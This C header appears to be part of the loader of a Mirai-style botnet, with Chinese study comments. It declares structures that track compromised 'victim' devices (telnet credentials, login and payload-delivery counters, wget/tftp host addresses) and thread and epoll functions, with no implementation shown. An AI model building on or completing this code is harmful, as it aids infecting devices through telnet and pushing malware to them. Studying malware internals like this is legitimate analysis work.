#pragma once

#include <sys/epoll.h>
#include "includes.h"
#include "telnet_info.h"
#include "connection.h"

//存储了这个server连接的victim信息
struct server {
    uint32_t max_open;  //决定了connection estab_conns的上限【max_open个】
    volatile uint32_t curr_open;
    //所有conn的总体情况
    volatile uint32_t total_input, total_logins, total_echoes, total_wgets, total_tftps, total_successes, total_failures;
    char *wget_host_ip, *tftp_host_ip;
    struct server_worker *workers;  //server_worker的结构体数组指针【每一个connection对应一个server_worker，维护这个连接的threads】
    struct connection **estab_conns;    //connection数组【里面的info包含了每个vitim的信息，addr、port、user、passwd】
    ipv4_t *bind_addrs;
    pthread_t to_thrd;
    port_t wget_host_port;
    uint8_t workers_len, bind_addrs_len;    //workers_len是workers成员的数量，也就是这个server可以开启的server_worker线程数
    int curr_worker_child;
    //server_worker *workers是处理事件的
    //connection **estab_conns是维护连接的
    //两者的关系是：
};

//事件处理的线程
struct server_worker {
    struct server *srv; //指回server指针。表示这个server_worker从属的server
    int efd; // We create a separate epoll context per thread so thread safety isn't our problem
    pthread_t thread;   //对应的线程信息
    uint8_t thread_id;
};

struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip);
void server_destroy(struct server *srv);
void server_queue_telnet(struct server *srv, struct telnet_info *info);
void server_telnet_probe(struct server *srv, struct telnet_info *info);
 
static void bind_core(int core);
static void *worker(void *arg);
static void handle_output_buffers(struct server_worker *);
static void handle_event(struct server_worker *wrker, struct epoll_event *ev);
static void *timeout_thread(void *);
